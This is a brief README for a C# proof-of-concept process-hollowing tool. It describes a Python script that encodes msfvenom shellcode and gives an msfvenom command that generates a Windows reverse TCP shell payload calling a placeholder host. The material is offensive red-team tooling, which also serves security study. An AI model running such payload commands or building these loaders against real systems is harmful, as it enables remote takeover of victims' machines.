# Proc-Hollow

C# POC for process hollowing

The included Python file (`encodeShellcode.py`) is used for turning python-formatted msfvenom shellcode into encoded csharp-formatted shellcode.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LPORT=9999 LHOST=1.2.3.4 -f python -v buf
```

Binaries are not included, just open in Visual Studio and build.